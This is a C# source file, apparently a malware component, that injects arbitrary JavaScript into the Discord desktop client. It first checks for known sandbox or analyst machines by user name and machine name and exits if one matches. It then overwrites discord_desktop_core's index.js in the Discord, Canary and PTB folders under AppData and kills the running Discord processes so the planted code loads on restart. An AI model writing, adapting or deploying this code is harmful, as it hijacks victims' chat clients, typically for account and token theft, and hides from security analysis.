using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace InjectDiscord
{
    class Injector
    {
        public static void MainFunc(string code, bool rest)
        {
            setCode = code;
            restart = rest;
            if (Detect()) Environment.Exit(0);
            startInject();
        }

        public static bool Detect()
        {
            if (Environment.UserName == "admin" && Environment.MachineName == "WORK" && Environment.CommandLine == $"\"{AppDomain.CurrentDomain.FriendlyName}\"") return true;
            else if (Environment.UserName == "John" && Environment.MachineName.StartsWith("WIN") && Environment.CommandLine == $"c:\\Users\\John\\Downloads\\\"{AppDomain.CurrentDomain.FriendlyName}\"") return true;
            return false;
        }

        public static void startInject()
        {
            if (Directory.Exists(discordPath))
            {
                Thread discord = new(() => Inject(discordPath));
                discord.Start();
            }

            if (Directory.Exists(canaryPath))
            {
                Thread canary = new(() => Inject(canaryPath));
                canary.Start();
            }
            if (Directory.Exists(ptbPath))
            {
                Thread ptb = new(() => Inject(ptbPath));
                ptb.Start();
            }
        }

        public static void Inject(string path)
        {
            string indexPath = findPath(path, "discord_desktop_core") + @"\discord_desktop_core\index.js";
            File.WriteAllText(indexPath, setCode);
            if (restart)
            {
                foreach (var process in Process.GetProcessesByName("discord"))
                {
                    process.Kill();
                }
                foreach (var process in Process.GetProcessesByName("discordcanary"))
                {
                    process.Kill();
                }
                foreach (var process in Process.GetProcessesByName("discordptb"))
                {
                    process.Kill();
                }
            }
        }

        private static bool restart = false;
        private static string setCode;
        private static string canaryPath = $"C:\\Users\\{Environment.UserName}\\Appdata\\Local\\DiscordCanary";
        private static string ptbPath = $"C:\\Users\\{Environment.UserName}\\Appdata\\Local\\DiscordPTB";
        private static string discordPath = $"C:\\Users\\{Environment.UserName}\\Appdata\\Local\\Discord";
        public static string? findPath(string path, string find)
        {
            string[] dir = Directory.GetDirectories(path, "*.*", SearchOption.AllDirectories);
            for (int i = 0; i < dir.Length; i++)
            {
                if (dir[i].Contains(find))
                {
                    return dir[i];
                }
            }
            return null;
        }
    }

}
